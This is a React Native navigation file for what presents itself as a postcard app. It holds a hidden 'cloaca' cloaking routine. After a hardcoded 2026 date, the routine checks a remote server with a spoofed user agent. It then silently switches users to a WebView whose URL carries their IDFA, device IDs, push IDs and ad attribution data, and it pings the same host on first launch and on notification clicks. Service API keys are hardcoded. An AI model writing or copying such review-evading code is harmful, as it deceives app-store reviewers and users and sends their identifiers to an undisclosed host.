import React, { useState, useEffect, useRef } from 'react';
import {
  Animated,
  Easing,
  Dimensions,
  View,
  Image,
  StatusBar,
} from 'react-native';
import { NavigationContainer } from '@react-navigation/native';
import { createNativeStackNavigator } from '@react-navigation/native-stack';

//import type { RootStackParamList } from './types';<Stack.Screen name="Splash" component={SplashScreen} />initialRouteName="Splash"
import SplashScreen from '../screens/SplashScreen';
import IntroScreen from '../screens/IntroScreen';
import MainTabNavigator from './MainTabNavigator';
import PostcardDetailScreen from '../screens/PostcardDetailScreen';
import ProductScreen from '../screens/ProductScreen';
const Stack = createNativeStackNavigator();
// libs
import ReactNativeIdfaAaid, {
  AdvertisingInfoResponse,
} from '@sparkfabrik/react-native-idfa-aaid';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { LogLevel, OneSignal } from 'react-native-onesignal';
import Tenjin from 'react-native-tenjin';
import AppleAdsAttribution from '@vladikstyle/react-native-apple-ads-attribution';
import DeviceInfo from 'react-native-device-info';

const RootNavigator = () => {
  const [route, setRoute] = useState(false);
  console.log('route===>', route)
  const [tenjinUid, setTenjinUid] = useState(null);
  const [sab1, setSab1] = useState();
  const [checkApsData, setCheckApsData] = useState();
  const [idfv, setIdfv] = useState(null);
  const [customerUserId, setCustomerUserId] = useState(null);
  const [isInstallConversionDone, setIsInstallConversionDone] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  //
  const [idfa, setIdfa] = useState(null);
  const [aceptTransperency, setAceptTransperency] = useState(false);
  const [responseToPushPermition, setResponseToPushPermition] = useState(null);
  const [oneSignalId, setOneSignalId] = useState(null);
  //
  const [timeStampUserId, setTimeStampUserId] = useState(false);
  const [uniqVisit, setUniqVisit] = useState(true);
  const [isDataReady, setIsDataReady] = useState(false);//
  const [atribParam, setAtribParam] = useState(null);
  const [checkAsaData, setCheckAsaData] = useState(null);//
  const [adServicesAtribution, setAdServicesAtribution] = useState(null);//
  const [pushOpenWebview, setPushOpenWebview] = useState(false);//
  const [completeLink, setCompleteLink] = useState(false);
  const [finalLink, setFinalLink] = useState('');
  const [attributionTimeoutDone, setAttributionTimeoutDone] = useState(false);
  const [cloacaPass, setCloacaPass] = useState(null);
  const [customUserAgent, setCustomUserAgent] = useState('');
  //const [webViewUserAgent, setWebViewUserAgent] = useState('');
  //console.log('UA IN ROOT ===>', webViewUserAgent);
  //console.log('UA IN customUserAgent ===>', customUserAgent);

  const TENJIN_API_KEY = `LYCCJRDDUZRDE6KYQDHFS8IXZMFEE8ZL`;

  const ONESIGNAL_KEY = `10b8b871-9fd9-4e05-8ea1-4b7ac9d46577`;

  const INITIAL_URL = `https://fresh-gate-cloud.site/`;
  const URL_IDENTIFAIRE = `JBEPei7u`;

  useEffect(() => {
  const fetchData = async () => {
    await Promise.all([checkUniqVisit(), getData()]); // Виконуються одночасно
    getTenjinAttributionInfo();
    setIsDataReady(true); // Встановлюємо, що дані готові
  };

  fetchData();
  }, []);
  
  // таймаут атрибуції
  useEffect(() => {
    if (!isDataReady) return;

    const timeout = setTimeout(() => {
      console.log('Timeout 6s → attribution fallback done');
      setAttributionTimeoutDone(true);
    }, 6000);

    return () => clearTimeout(timeout);
  }, [isDataReady]);

  // useEffect з generateLink()
  useEffect(() => {
    const finalizeProcess = async () => {
      const attributionReady = isInstallConversionDone || attributionTimeoutDone;

      if (!isDataReady || !attributionReady) return;

      await generateLink();
      console.log('Фінальна лінка сформована!');

      setIsLoading(true);
    };

    finalizeProcess();
  }, [isDataReady, isInstallConversionDone, attributionTimeoutDone]);

  // uniq_visit
  const checkUniqVisit = async () => {
    const uniqVisitStatus = await AsyncStorage.getItem('uniqVisitStatus');
    let storedTimeStampUserId = await AsyncStorage.getItem('timeStampUserId');

    // додати діставання таймштампу з асінк сторідж

    if (!uniqVisitStatus) {
      // Генеруємо унікальний ID користувача з timestamp
      /////////////Timestamp + user_id generation
      const timestamp_user_id = `${new Date().getTime()}-${Math.floor(
        1000000 + Math.random() * 9000000,
      )}`;
      setTimeStampUserId(timestamp_user_id);
      console.log('timeStampUserId==========+>', timeStampUserId);

      // Зберігаємо таймштамп у AsyncStorage
      await AsyncStorage.setItem('timeStampUserId', timestamp_user_id);

      await fetch(
        `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=uniq_visit&jthrhg=${timestamp_user_id}`,
      );
      OneSignal.User.addTag('timestamp_user_id', timestamp_user_id);
      console.log('унікальний візит!!!');
      setUniqVisit(false);
      await AsyncStorage.setItem('uniqVisitStatus', 'sent');

      // додати збереження таймштампу в асінк сторідж
    } else {
      if (storedTimeStampUserId) {
        setTimeStampUserId(storedTimeStampUserId);
        console.log('Відновлений timeStampUserId:', storedTimeStampUserId);
      }
    }
  };

  useEffect(() => {
    setData();
  }, [
    tenjinUid,
    sab1,
    checkApsData,
    customerUserId,
    idfv,
    route,
    idfa,
    aceptTransperency,
    responseToPushPermition,
    oneSignalId,
    timeStampUserId,
    uniqVisit,
    atribParam,
    checkAsaData,
    adServicesAtribution,
    pushOpenWebview,
    completeLink,
    finalLink,
    cloacaPass,
    customUserAgent,
    //webViewUserAgent
  ]);

  const getData = async () => {
    try {

      const jsonData = await AsyncStorage.getItem('App');

      if (jsonData !== null) {
        const parsedData = JSON.parse(jsonData);
        console.log('App.js Отримані дані з AsyncStorage:', parsedData);

        setTenjinUid(parsedData.tenjinUid ?? null);
        setSab1(parsedData.sab1);
        setCheckApsData(parsedData.checkApsData ?? null);
        setCustomerUserId(parsedData.customerUserId ?? null);
        setIdfv(parsedData.idfv ?? null);

        setRoute(parsedData.route ?? false);
        setIdfa(parsedData.idfa ?? null);
        setAceptTransperency(parsedData.aceptTransperency ?? false);
        setResponseToPushPermition(parsedData.responseToPushPermition ?? null);
        setOneSignalId(parsedData.oneSignalId ?? null);

        setTimeStampUserId(parsedData.timeStampUserId ?? false);
        setUniqVisit(parsedData.uniqVisit ?? true);

        setAtribParam(parsedData.atribParam ?? null);
        setCheckAsaData(parsedData.checkAsaData ?? null);
        setAdServicesAtribution(parsedData.adServicesAtribution ?? null);
        setPushOpenWebview(parsedData.pushOpenWebview ?? false);

        setCompleteLink(parsedData.completeLink ?? false);
        setFinalLink(parsedData.finalLink ?? '');
        setCloacaPass(parsedData.cloacaPass ?? null);
        setCustomUserAgent(parsedData.customUserAgent);
        //setWebViewUserAgent(parsedData.webViewUserAgent);

        // якщо дані вже відновили з кешу, не блокуємо app
        setIsInstallConversionDone(true);

      } else {

        const results = await Promise.all([

          fetchAdServicesAttributionData(),
          
          requestOneSignallFoo(),
        ]);
        fetchIdfa(),
        await performTenjinOperations();
        
        setTimeout(() => {
          getTenjinUid();
        }, 1000);
        
        // Результати виконаних функцій
        console.log('Результати функцій:', results);

      }
    } catch (error) {
      console.log('Помилка отримання даних з AsyncStorage:', error);
    }

  };

  const setData = async () => {
    try {
      const data = {
        tenjinUid,
        sab1,
        checkApsData,
        customerUserId,
        idfv,
        route,
        idfa,
        aceptTransperency,
        responseToPushPermition,
        oneSignalId,
        timeStampUserId,
        uniqVisit,
        atribParam,
        checkAsaData,
        adServicesAtribution,
        pushOpenWebview,
        completeLink,
        finalLink,
        cloacaPass,
        customUserAgent,
        //webViewUserAgent

      };
      const jsonData = JSON.stringify(data);
      await AsyncStorage.setItem('App', jsonData);
      console.log('Дані збережено в AsyncStorage');
    } catch (e) {
      console.log('Помилка збереження даних:', e);
    }
  };

  const fetchAdServicesAttributionData = async () => {
    try {
      const adServicesAttributionData =
        await AppleAdsAttribution.getAdServicesAttributionData();
      //console.log('adservices' + adServicesAttributionData);

      // Извлечение значений из объекта
      ({ attribution } = adServicesAttributionData); // Присваиваем значение переменной attribution
      ({ keywordId } = adServicesAttributionData);

      setAdServicesAtribution(attribution);
      //setAdServicesKeywordId(keywordId);!sab1 ||
      //setSab1(attribution ? 'asa' : '');
      setAtribParam(attribution ? 'asa' : '');
      setCheckAsaData(JSON.stringify(adServicesAttributionData));

      // Вывод значений в консоль
      //Alert.alert(`sab1: ${sab1}`);
      //Alert.alert(`Attribution: ${attribution}`);
      console.log(`Attribution: ${attribution}` + `KeywordId:${keywordId}`);
    } catch (error) {
      const { message } = error;
      //Alert.alert(message); // --> Some error message
    } finally {
      console.log('Attribution');
    }
  };

  ///////// Tenjin
  // 1ST FUNCTION - Ініціалізація Tenjin
  const performTenjinOperations = async () => {
    try {
      console.log('TENJIN 1');

      Tenjin.initialize(TENJIN_API_KEY);
      Tenjin.connect();

      const uniqueId = await DeviceInfo.getUniqueId();
      setIdfv(uniqueId);

      Tenjin.setCustomerUserId(uniqueId);
      setCustomerUserId(uniqueId);

      console.log('Tenjin ініціалізовано успішно');
    } catch (error) {
      console.log('Помилка під час виконання операцій Tenjin:', error);
    }
  };

  // 2ND FUNCTION - Отримання UID Tenjin
  const getTenjinUid = async () => {
    console.log('TENJIN 2');
    const maxRetries = 5;
    let attempts = 0;

    const fetchUid = async () => {
      try {
        Tenjin.getAnalyticsInstallationId(uid => {
          if (uid) {
            console.log('on getAnalyticsInstallationId: ' + uid);
            setTenjinUid(uid);
          } else if (attempts < maxRetries) {
            attempts++;
            console.log(`Tenjin UID is null, retrying ${attempts}/${maxRetries}...`);
            setTimeout(fetchUid, 1000);
          } else {
            console.error('Failed to retrieve Tenjin UID after 5 attempts');
          }
        });
      } catch (error) {
        if (attempts < maxRetries) {
          attempts++;
          setTimeout(fetchUid, 1000);
        } else {
          console.log('Error fetching Tenjin UID:', error);
        }
      }
    };

    fetchUid();
  };

  // 3RD FUNCTION - Отримання attribution Tenjin
  const getTenjinAttributionInfo = () => {
    try {
      console.log('TENJIN 3');

      Tenjin.getAttributionInfo(
        res => {
          try {
            const attribution = Array.isArray(res) ? res[0] : res;

            if (attribution) {
              console.log('Tenjin attribution response ==>', attribution);

              setCheckApsData(JSON.stringify(attribution));

              if (attribution?.campaign_name) {
                setSab1(attribution.campaign_name);
              }
            } else {
              console.log('Tenjin attribution empty');
              setCheckApsData(null);
            }
          } catch (error) {
            console.log('Error processing Tenjin attribution:', error);
          } finally {
            setIsInstallConversionDone(true);
          }
        },
        error => {
          console.log('Tenjin attribution error:', error);
          setIsInstallConversionDone(true);
        },
      );
    } catch (error) {
      console.log('Tenjin getAttributionInfo call error:', error);
      setIsInstallConversionDone(true);
    }
  };

  // IDFA / ATT status
  const fetchIdfa = async () => {
  try {
    const res = await ReactNativeIdfaAaid.getAdvertisingInfo();

    if (!res.isAdTrackingLimited) {
      setIdfa(res.id);
      setTimeout(() => {
        setAceptTransperency(true);
      }, 1500);
    } else {
      setIdfa('00000000-0000-0000-0000-000000000000');
      setTimeout(() => {
        setAceptTransperency(true);
      }, 2500);
      console.log('НЕ ЗГОДА!!!!!!!!!');
    }
  } catch (err) {
    setIdfa(null);
    setAceptTransperency(true);
    console.log('Помилка отримання IDFA:', err);
  }
};

  ///////// OneSignall
  const requestPermission = () => {
    return new Promise((resolve, reject) => {
      try {
        OneSignal.Notifications.requestPermission(true).then(res => {
          setResponseToPushPermition(res);

          const maxRetries = 5; // Кількість повторних спроб
          let attempts = 0;

          const fetchOneSignalId = () => {
            OneSignal.User.getOnesignalId()
              .then(deviceState => {
                if (deviceState) {
                  setOneSignalId(deviceState);
                  resolve(deviceState); // Розв'язуємо проміс, коли отримано ID
                } else if (attempts < maxRetries) {
                  attempts++;
                  setTimeout(fetchOneSignalId, 1000); // Повторна спроба через 1 секунду
                } else {
                  reject(new Error('Failed to retrieve OneSignal ID'));
                }
              })
              .catch(error => {
                if (attempts < maxRetries) {
                  attempts++;
                  setTimeout(fetchOneSignalId, 1000);
                } else {
                  console.error('Error fetching OneSignal ID:', error);
                  reject(error);
                }
              });
          };

          fetchOneSignalId(); // Викликаємо першу спробу отримання ID
        });
      } catch (error) {
        reject(error);
      }
    });
  };

  // Виклик асинхронної функції requestPermission() з використанням async/await
  const requestOneSignallFoo = async () => {
    try {
      await requestPermission();
      // Якщо все Ok
    } catch (error) {
      console.log('err в requestOneSignallFoo==> ', error);
    }
  };

  useEffect(() => {
    // Remove this method to stop OneSignal Debugging
    OneSignal.Debug.setLogLevel(LogLevel.Verbose);

    // OneSignal ініціалізація
    OneSignal.initialize(ONESIGNAL_KEY);
    //OneSignal.Debug.setLogLevel(OneSignal.LogLevel.Verbose);
  }, []);

  // Встановлюємо цей ID як OneSignal External ID
  useEffect(() => {
    if (timeStampUserId) {
      console.log(
        'OneSignal.login із таймштампом:',
        timeStampUserId,
        'полетів',
      );
      OneSignal.login(timeStampUserId);
    }
  }, [timeStampUserId]);

  // event push_open_browser & push_open_webview
  const pushOpenWebViewOnce = useRef(false); // Стан, щоб уникнути дублювання

  useEffect(() => {
    // Додаємо слухач подій
    const handleNotificationClick = async event => {
      if (pushOpenWebViewOnce.current) {
        // Уникаємо повторної відправки івента
        return;
      }

      let storedTimeStampUserId = await AsyncStorage.getItem('timeStampUserId');
      //console.log('storedTimeStampUserId', storedTimeStampUserId);

      // Виконуємо fetch тільки коли timeStampUserId є
      if (event.notification.launchURL) {
        setPushOpenWebview(true);
        fetch(
          `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=push_open_browser&jthrhg=${storedTimeStampUserId}`,
        );
        //console.log('Івент push_open_browser OneSignal');
        //console.log(
        //  `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=push_open_browser&jthrhg=${storedTimeStampUserId}`,
        //);
      } else {
        setPushOpenWebview(true);
        fetch(
          `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=push_open_webview&jthrhg=${storedTimeStampUserId}`,
        );
        //console.log('Івент push_open_webview OneSignal');
        //console.log(
        //  `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=push_open_webview&jthrhg=${storedTimeStampUserId}`,
        //);
      }

      pushOpenWebViewOnce.current = true; // Блокування повторного виконання
      setTimeout(() => {
        pushOpenWebViewOnce.current = false; // Зняття блокування через певний час
      }, 2500); // Затримка, щоб уникнути подвійного кліку
    };

    OneSignal.Notifications.addEventListener('click', handleNotificationClick);
    //Add Data Tags
    //OneSignal.User.addTag('timeStampUserId', timeStampUserId);

    return () => {
      // Видаляємо слухача подій при розмонтуванні
      OneSignal.Notifications.removeEventListener(
        'click',
        handleNotificationClick,
      );
    };
  }, []);

  ///////// Route useEff
  useEffect(() => {
    // чекаємо, поки прочитаємо AsyncStorage
    if (!isDataReady) return;

    // якщо вже є route або клоака вже проходила успішно – нічого не робимо
    if (route || cloacaPass) return;

    const checkUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}`;
    //console.log('checkUrl==========+>', checkUrl);

    const targetData = new Date('2026-03-25T18:08:00'); //дата з якої поч працювати webView
    const currentData = new Date(); //текущая дата

    if (currentData <= targetData) {
      setRoute(false);
      return;
    }

    const fetchCloaca = async () => {

      try {
        const userAgent = await DeviceInfo.getUserAgent();
        const systemVersion = DeviceInfo.getSystemVersion();
        const deviceModel = DeviceInfo.getModel();

        const customUserAgent = `${userAgent} ${deviceModel} Safari/604.1`;


        setCustomUserAgent(customUserAgent);
        
        const r = await fetch(checkUrl, {
          method: 'GET',
          headers: {
            'User-Agent': customUserAgent,
          },
        });

        console.log('status по клоаке=++++++++++++=>', r.status);

        if (r.status !== 404) {
          setRoute(true);
          setCloacaPass(true); // 👈 збережеться в AsyncStorage через setData
        } else {
          setRoute(false);
        }
      } catch (e) {
        console.log('errar', e);
        setRoute(false);
      }
    };

    fetchCloaca();
  }, [isDataReady, route, cloacaPass]);

  ///////// Generate link
  const generateLink = async () => {
    try {
      console.log('Створення базової частини лінки');
      const baseUrl = [
        `${INITIAL_URL}${URL_IDENTIFAIRE}?${URL_IDENTIFAIRE}=1`,
        idfa ? `idfa=${idfa}` : '',
        tenjinUid ? `uid=${tenjinUid}` : '',
        customerUserId ? `customerUserId=${customerUserId}` : '',
        idfv ? `idfv=${idfv}` : '',
        oneSignalId ? `oneSignalId=${oneSignalId}` : '',
        `jthrhg=${timeStampUserId}`,
      ]
        .filter(Boolean)
        .join('&');

      // Логіка обробки sab1
      let additionalParams = '';
      if (sab1) {
        if (sab1.includes('_')) {
          console.log('Якщо sab1 містить "_", розбиваємо і формуємо subId');
          // Якщо sab1 містить "_", розбиваємо і формуємо subId
          let sabParts = sab1.split('_');
          additionalParams =
            sabParts
              .map((part, index) => `subId${index + 1}=${part}`)
              .join('&') + `&checkData=${checkApsData}`;
        } else {
          console.log('Якщо sab1 не містить "_", встановлюємо subId1=sab1');
          //// Якщо sab1 не містить "_", встановлюємо subId1=sab1
          additionalParams = `checkData=${checkApsData}`;
        }
      } else {
        console.log(
          'Якщо sab1 undefined або пустий, встановлюємо subId1=atribParam',
        );
        // Якщо sab1 undefined або пустий, встановлюємо subId1=atribParam
        additionalParams = `${
          atribParam ? `subId1=${atribParam}` : ''
        }&checkData=${checkAsaData}`;
      }
      console.log('additionalParams====>', additionalParams);
      // Формування фінального лінку
      const product = `${baseUrl}&${additionalParams}${
        pushOpenWebview ? `&yhugh=${pushOpenWebview}` : ''
      }`;
      //(!addPartToLinkOnce ? `&yhugh=true` : ''); pushOpenWebview && '&yhugh=true'
      console.log('Фінальна лінка сформована');

      // Зберігаємо лінк в стейт
      setFinalLink(product);

      // Встановлюємо completeLink у true
      setTimeout(() => {
        setCompleteLink(true);
      }, 1000);
    } catch (error) {
      console.error('Помилка при формуванні лінку:', error);
    }
  };
  console.log('My product Url ==>', finalLink);

  ///////// Route
  const Route = ({ isFatch }) => {
    if (isFatch && !completeLink) {
      // Показуємо тільки лоудери, поки acceptTransparency і completeLink не true
      //return null;
      return <SplashScreen />;
    }

    if (isFatch) {
      return (
        <Stack.Navigator>
          <Stack.Screen
            initialParams={{
              responseToPushPermition,
              product: finalLink,
              timeStampUserId: timeStampUserId,
              customUserAgent: customUserAgent,
            }}
            name="ProductScreen"
            component={ProductScreen}
            options={{ headerShown: false }}
          />
        </Stack.Navigator>
      );
    }
    return (
      <Stack.Navigator
          screenOptions={{ headerShown: false }}
        >
          <Stack.Screen name="Intro" component={IntroScreen} />
          <Stack.Screen name="MainTabs" component={MainTabNavigator} />
          <Stack.Screen name="PostcardDetail" component={PostcardDetailScreen} />
        </Stack.Navigator>
    );
  };
  //const [isLoading, setIsLoading] = useState(false);
  //
  //setTimeout(() => {
  //  setIsLoading(true);
  //}, 8400);

  return (
    <NavigationContainer>
      {!isLoading ? (
        <SplashScreen />
      ) : (
        <Route isFatch={route} />
      )}
    </NavigationContainer>
  );
};

export default RootNavigator;